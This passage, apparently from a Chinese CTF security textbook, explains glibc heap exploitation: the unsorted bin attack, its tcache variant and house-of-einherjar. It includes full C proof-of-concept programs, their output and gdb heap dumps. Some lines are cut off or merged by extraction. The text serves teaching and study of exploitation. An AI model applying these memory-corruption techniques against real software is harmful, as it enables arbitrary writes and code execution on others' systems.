3.1.8 Linux 堆利用（三）
unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一
个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控
制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过
unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻
击提供便利。
unlink 的对 unsorted bin 的操作是这样的：
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
其中 bck = victim->bk 。
首先分配两个 chunk，然后释放掉第一个，它将被加入到 unsorted bin 中：
522
3.1.8 Linux 堆利用（三）
gef➤ x/26gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000091 TAIL
从而泄漏了 unsorted bin 的头部地址。
那么继续来看 libc-2.27 里怎么处理：
524
3.1.8 Linux 堆利用（三）
#include 
#include 
int main() {
unsigned long stack_var = 0;
fprintf(stderr, "The target we want to rewrite on stack: %p
-> %ld\n\n", &stack_var, stack_var);
unsigned long *p = malloc(0x80);
unsigned long *p1 = malloc(0x10);
fprintf(stderr, "Now, we allocate first small chunk on the h
eap at: %p\n",p);
free(p);
fprintf(stderr, "Freed the first chunk to put it in a tcache
bin\n");
p[0] = (unsigned long)(&stack_var);
fprintf(stderr, "Overwrite the next ptr with the target addr
ess\n");
malloc(0x80);
malloc(0x80);
fprintf(stderr, "Now we malloc twice to make tcache struct's
counts '0xff'\n\n");
free(p);
fprintf(stderr, "Now free again to put it in unsorted bin\n"
);
p[1] = (unsigned long)(&stack_var - 2);
fprintf(stderr, "Now write its bk ptr with the target addres
s-0x10: %p\n\n", (void*)p[1]);
malloc(0x80);
fprintf(stderr, "Finally malloc again to get the chunk at ta
rget address: %p -> %p\n", &stack_var, (void*)stack_var);
}
525
3.1.8 Linux 堆利用（三）
$ gcc -g tcache_unsorted_bin_attack.c
$ ./a.out
The target we want to rewrite on stack: 0x7ffef0884c10 -> 0
Now, we allocate first small chunk on the heap at: 0x56486690726
0
Freed the first chunk to put it in a tcache bin
Overwrite the next ptr with the target address
Now we malloc twice to make tcache struct's counts '0xff'
Now free again to put it in unsorted bin
Now write its bk ptr with the target address-0x10: 0x7ffef0884c0
0
Finally malloc again to get the chunk at target address: 0x7ffef
0884c10 -> 0x7f69ba1d8ca0
我们知道由于 tcache 的存在，malloc 从 unsorted bin 取 chunk 的时候，如果对应
的 tcache bin 还未装满，则会将 unsorted bin 里的 chunk 全部放进对应的 tcache
bin，然后再从 tcache bin 中取出。那么问题就来了，在放进 tcache bin 的这个过
程中，malloc 会以为我们的 target address 也是一个 chunk，然而这个 "chunk" 是
过不了检查的，将抛出 "memory corruption" 的错误：
while ((victim = unsorted_chunks (av)->bk) != unsorted_chu
nks (av))
{
bck = victim->bk;
if (__builtin_expect (chunksize_nomask (victim)  av->system_mem, 0))
malloc_printerr ("malloc(): memory corruption");
那么要想跳过放 chunk 的这个过程，就需要对应 tcache bin 的 counts 域不小于
tcache_count（默认为7），但如果 counts 不为 0，说明 tcache bin 里是有 chunk
的，那么 malloc 的时候会直接从 tcache bin 里取出，于是就没有 unsorted bin 什
么事了：
526
3.1.8 Linux 堆利用（三）
if (tc_idx entries[tc_idx] != NULL)
{
return tcache_get (tc_idx);
}
这就造成了矛盾，所以我们需要找到一种既能从 unsorted bin 中取 chunk，又不会
将 chunk 放进 tcache bin 的办法。
于是就得到了上面的利用 tcache poisoning（参考章节4.14），将 counts 修改成了
0xff ，于是在进行到下面这里时就会进入 else 分支，直接取出 chunk 并返回：
#if USE_TCACHE
/* Fill cache first, return to user only if cache fill
s.
We may return one of these chunks later. */
if (tcache_nb
&& tcache->counts[tc_idx] 
#include 
#include 
#include 
#include 
int main() {
uint8_t *a, *b, *d;
a = (uint8_t*) malloc(0x10);
int real_a_size = malloc_usable_size(a);
memset(a, 'A', real_a_size);
fprintf(stderr, "We allocate 0x10 bytes for 'a': %p\n\n", a)
;
size_t fake_chunk[6];
fake_chunk[0] = 0x80;
fake_chunk[1] = 0x80;
fake_chunk[2] = (size_t) fake_chunk;
fake_chunk[3] = (size_t) fake_chunk;
fake_chunk[4] = (size_t) fake_chunk;
fake_chunk[5] = (size_t) fake_chunk;
fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_c
hunk);
fprintf(stderr, "prev_size: %#lx\n", fake_chunk[0]);
fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]);
fprintf(stderr, "bck: %#lx\n", fake_chunk[3]);
fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
fprintf(stderr, "bck_nextsize: %#lx\n\n", fake_chunk[5]);
b = (uint8_t*) malloc(0xf8);
int real_b_size = malloc_usable_size(b);
uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);
fprintf(stderr, "We allocate 0xf8 bytes for 'b': %p\n", b);
fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
fprintf(stderr, "We overflow 'a' with a single null byte int
o the metadata of 'b'\n");
a[real_a_size] = 0;
528
3.1.8 Linux 堆利用（三）
fprintf(stderr, "b.size: %#lx\n\n", *b_size_ptr);
size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*
)fake_chunk);
*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
fprintf(stderr, "We write a fake prev_size to the last %lu b
ytes of a so that it will consolidate with our fake chunk\n", si
zeof(size_t));
fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n
\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
fake_chunk[1] = fake_size;
fprintf(stderr, "Modify fake chunk's size to reflect b's new
prev_size\n");
fprintf(stderr, "Now we free b and this will consolidate wit
h our fake chunk\n");
free(b);
fprintf(stderr, "Our fake chunk size is now %#lx (b.size + f
ake_prev_size)\n", fake_chunk[1]);
d = malloc(0x10);
memset(d, 'A', 0x10);
fprintf(stderr, "\nNow we can call malloc() and it will begi
n in our fake chunk: %p\n", d);
}
529
3.1.8 Linux 堆利用（三）
$ gcc -g house_of_einherjar.c
$ ./a.out
We allocate 0x10 bytes for 'a': 0xb31010
Our fake chunk at 0x7ffdb337b7f0 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffdb337b7f0
bck: 0x7ffdb337b7f0
fwd_nextsize: 0x7ffdb337b7f0
bck_nextsize: 0x7ffdb337b7f0
We allocate 0xf8 bytes for 'b': 0xb31030
b.size: 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
We write a fake prev_size to the last 8 bytes of a so that it wi
ll consolidate with our fake chunk
Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff800
24d7b5830
Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_pre
v_size)
Now we can call malloc() and it will begin in our fake chunk: 0x
7ffdb337b800
house-of-einherjar 是一种利用 malloc 来返回一个附近地址的任意指针。它要求有
一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 PREV_IN_USE 标
志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。当 next chunk 被释放
时，它会发现前一个 chunk 被标记为空闲状态，然后尝试合并堆块。只要我们精心
构造一个 fake chunk，让合并后的堆块范围到 fake chunk 处，那下一次 malloc 将
返回我们想要的地址。比起前面所讲过的 poison-null-byte ，更加强大，但是要求
的条件也更多一点，比如一个堆信息泄漏。
530
3.1.8 Linux 堆利用（三）
首先分配一个假设存在 off_by_one 溢出的 chunk a，然后在栈上创建我们的 fake
chunk，chunk 大小随意，只要是 small chunk 就可以了：
gef➤ x/8gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk
a
0x603010: 0x4141414141414141 0x4141414141414141
0x603020: 0x4141414141414141 0x0000000000020fe1 <-- top c
hunk
0x603030: 0x0000000000000000 0x0000000000000000
gef➤ x/8gx &fake_chunk
0x7fffffffdcb0: 0x0000000000000080 0x0000000000000080 <--
fake chunk
0x7fffffffdcc0: 0x00007fffffffdcb0 0x00007fffffffdcb0
0x7fffffffdcd0: 0x00007fffffffdcb0 0x00007fffffffdcb0
0x7fffffffdce0: 0x00007fffffffddd0 0xffa7b97358729300
接下来创建 chunk b，并利用 chunk a 的溢出将 size 字段覆盖掉，清除了
PREV_INUSE 标志，chunk b 就会以为前一个 chunk 是一个 free chunk 了：
gef➤ x/8gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk
a
0x603010: 0x4141414141414141 0x4141414141414141
0x603020: 0x4141414141414141 0x0000000000000100 <-- chunk
b
0x603030: 0x0000000000000000 0x0000000000000000
原本 chunk b 的 size 字段应该为 0x101，在这里我们选择 malloc(0xf8) 作为 chunk
b 也是出于方便的目的，覆盖后只影响了标志位，没有影响到大小。
接下来根据 fake chunk 在栈上的位置修改 chunk b 的 prev_size 字段。计算方法是
用 chunk b 的起始地址减去 fake chunk 的起始地址，同时为了绕过检查，还需要
将 fake chunk 的 size 字段与 chunk b 的 prev_size 字段相匹配：